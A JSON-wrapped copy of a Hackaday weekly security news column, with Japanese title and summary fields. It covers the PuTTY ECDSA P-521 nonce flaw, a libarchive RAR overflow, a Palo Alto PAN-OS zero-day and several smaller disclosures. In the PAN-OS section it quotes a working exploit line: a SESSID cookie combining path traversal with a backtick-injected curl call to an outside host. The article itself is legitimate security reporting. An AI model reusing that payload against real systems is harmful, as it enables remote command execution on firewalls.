{"pubDate": "2024-04-19T14:00:15", "original_title": "This Week in Security: Putty Keys, Libarchive, and Palo Alto", "link": "https://hackaday.com/2024/04/19/this-week-in-security-putty-keys-libarchive-and-palo-alto/", "source": "https://hackaday.com/blog/feed/", "thumbnail": "https://hackaday.com/wp-content/uploads/2016/01/darkarts.jpg", "original_content": "It may be time to rotate some keys. The venerable PuTTY was updated to 0.81 this week, and the major fix was a change to how ecdsa-sha2-nistp521 signatures are generated. The problem was reported on the oss-security mailing list, and its quite serious, though thankfully with a somewhat narrow coverage.\nThe PuTTY page on the vulnerability has the full details. To understand whats going on, we need to briefly cover ECDSA, nonces, and elliptic curve crypto. All cryptography depends on one-way functions. In the case of RSA, its multiplying large primes together. The multiplication is easy, but given just the final result, its extremely difficult to find the two factors. DSA uses a similar problem, the discrete logarithm problem: raising a number to a given exponent, then doing modulo division.\nYet another cryptography primitive is the elliptic curve, which uses point multiplication as the one-way function. Ive described it as a mathematical pinball, bouncing around inside the curve. Its reasonably easy to compute the final point, but essentially impossible to trace the path back to the origin. Formally this is the Elliptic Curve Discrete Logarithm Problem, and its not considered to be quantum-resistant, either.\nOne of the complete schemes is ECDSA, which combines the DSA scheme with Elliptic Curves. Part of this calculation uses a nonce, denoted k, a number that is only used once. In ECDSA, k must be kept secret, and any repetition of different messages with the same nonce can lead to rapid exposure of the secret key.\nAnd now we get to PuTTY, which was written for Windows back before that OS had any good cryptographic randomness routines. As weve already mentioned, re-use of k, the nonce, is disastrous for DSA. So, PuTTY did something clever, and took the private key and the contents of the message to be signed, hashed those values together using SHA-512, then used modulo division to reduce the bit-length to what was needed for the given k value. The problem is the 521-bit ECDSA, which takes a 521-bit k. Thats even shorter than the output of a SHA-512, so the resulting k value always started with nine 0 bits.\nYoud be forgiven for thinking thats not enough to impact security, but the latest techniques mean that with the public key and about 60 valid signatures, the private key can be deduced. And this isnt just PuTTY thats impacted, since a few other Windows applications re-use the PuTTY code, like FileZilla, WinSCP and TortoiseGit/SVN. On the other hand, the break does require access to the public key, which isnt readily available to a Man-in-the-Middle (MitM) attacker. The real danger is that using one of these ecdsa-sha2-nistp521 keys to repeatedly log in to a compromised server would compromise the private key to a malicious actor on that server.\nPuTTY 0.81, FileZilla 3.67.0, WinSCP 6.3.3 and TortoiseGit 2.15.0.1 are the updated versions, with TortoiseSVN coming soon. At this point, any ecdsa-sha2-nistp521 key on a Windows machine should probably get revoked and recycled.\nQuantum Enters the Chat\nThere are a few cryptography schemes that are considered to be quantum safe, most notably the new Kyber and Dilithium approaches, both employing one-way problems based on lattices. Theres a brand new paper by [Yilei Chen] thats in pre-print, that suggests a way to use quantum computing to solve the Shortest Independent Vector Problem. Now lets be clear, this paper does not claim to break Kyber or Dilithium, even with a theoretical quantum computer. But what it does claim is to present a quantum algorithm that applies to a similar problem space. And thats enough to make the worlds cryptographers a bit nervous.\nLibarchive Says Rar!\nThe setup for this one is that Windows includes Libarchive for extracting various archive types, including .rar files. These files are split up into blocks, with each block beginning with a header listing out the type and size of each block. Decompression is interesting, with the routine running a very simple VM to loop through the archive.\nThe problem is that when a block length is set to 4, libarchive can be convinced to subtract 5, and overflow the loop counter to MAX_INT. And that means out-of-bounds writes, with the potential for arbitrary remote code execution. This vulnerability was patched in January, so most of us should already have it, but now that theres a thorough write-up, expect malicious rar files to show up in spam emails near you.\nGlobalProtect\nResearchers at Volexity shared their findings last week, of a threat actor using a 0-day vulnerability in Palo Alto PAN-OS. And one of the first observations we can make is that this is an outstanding job from Volexity and Palo Alto, in finding the first sign of compromise on April 10, and publishing advisories and a partial mitigation on the 12th, with the first hotfixes getting pushed on the 14th.\nNow that we know what to look for, it turns out that the first signs of use were back on March 26, where the vulnerability was used to simply touch a file location. While thats not a lot of time for widespread exploitation, it is enough that pretty much every PAN-OS device should now be regarded with suspicion.\nAs for the exploit details, the folks at watchTowr have us covered. The first juicy observation is that connecting to the device with a SESSID cookie set, will create an empty file on the device with that name, without appropriate sanitization or directory traversal. Whats really interesting is that when telemetry is enabled, this file is uploaded using curl, with the full file name getting called as part of the command. Was it possible to use only valid filenames to escape that command and run arbitrary commands? Why yes, yes it was. Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/hellothere226`curl${IFS}x1.outboundhost.com`;\nNow that exact attack chain requires telemetry to be enabled, and turning that off was one of the early mitigation steps listed. Turns out there are other ways to turn this underlying bug into an exploit, though those havent been shared publicly that Ive seen.\nProject Zero is Back\nIts been quite a while since weve heard anything from Googles Project Zero, but thats apparently because theyve been working on big projects. Like, in this case, auditing the Windows NT kernels handling of registry data. That effort has managed to find 50 separate CVEs, as well as a few issues that didnt quite pass muster as vulnerabilities. Look forward to some in-detail coverage to come on these issues.\nBits and Bytes\nTwo very nice write-ups came out this week, one from Rhino Security Labs about a pair of issues in the Kemp LoadMaster load balancer. There, a Cross-Site Request Forgery (CSRF) issue could be chained with an authenticated command injection issue to take over the appliance. The second is from [Johnny Yu] about a hard-coded key in the Delinea Secret Server, that allows spoofing API Tokens. The worst part about the Delinea issue is that the company refused to open a case, since the researcher wasnt a paying customer. Eek. Now that the vulnerability is public, its finally getting addressed.\nThe Element Android app had an issue where an intent launched from an external application could include an EXTRA_NEXT_INTENT, which would launch internal-only intents, bypassing the normal security layer. This allowed a few nasty tricks, like launching an arbitrary web page inside the Element app.\n[Adnan Khan] is working on a tool to scan Github Actions for vulnerable triggers, with an emphasis on self-hosted runners. That tool found a nice credential leak in Googles Flank project on Github, and netted [Adnan] a cool $7,500. Watch this space for an Open-Sourced release of the tool.", "title": "- PuTTY\u306e\u8106\u5f31\u6027\u4fee\u6b63\u306b\u95a2\u3059\u308b\u91cd\u8981\u306a\u60c5\u5831", "body": "PuTTY\u306e\u6700\u65b0\u7248\u3067\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6b20\u9665\u304c\u4fee\u6b63\u3055\u308c\u3001ECDSA\u30a2\u30eb\u30b4\u30ea\u30ba\u30e0\u306b\u95a2\u3059\u308b\u554f\u984c\u304c\u89e3\u6c7a\u3055\u308c\u307e\u3057\u305f\u3002\u4ed6\u306eWindows\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3082\u5f71\u97ff\u3092\u53d7\u3051\u3066\u3044\u307e\u3059\u3002\u95a2\u9023\u30d1\u30c3\u30c1\u304c\u30ea\u30ea\u30fc\u30b9\u3055\u308c\u305f\u306e\u3067\u3001\u5bfe\u7b56\u304c\u5fc5\u8981\u3067\u3059\u3002", "titles": ["- PuTTY\u306e\u8106\u5f31\u6027\u4fee\u6b63\u306b\u95a2\u3059\u308b\u91cd\u8981\u306a\u60c5\u5831", "- Windows\u306e\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306b\u5f71\u97ff\u3092\u53ca\u307c\u3059ECDSA\u306b\u3088\u308b\u9375\u306e\u56de\u8ee2", "- Libarchive\u306b\u304a\u3051\u308b\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u8106\u5f31\u6027\u3068.rar\u30d5\u30a1\u30a4\u30eb\u306e\u554f\u984c", "- Palo Alto PAN-OS\u306e0-day\u8106\u5f31\u6027\u3068\u305d\u306e\u5f71\u97ff", "- Google\u306eProject Zero\u304cWindows NT kernel\u306e\u554f\u984c\u3092\u767a\u898b"]}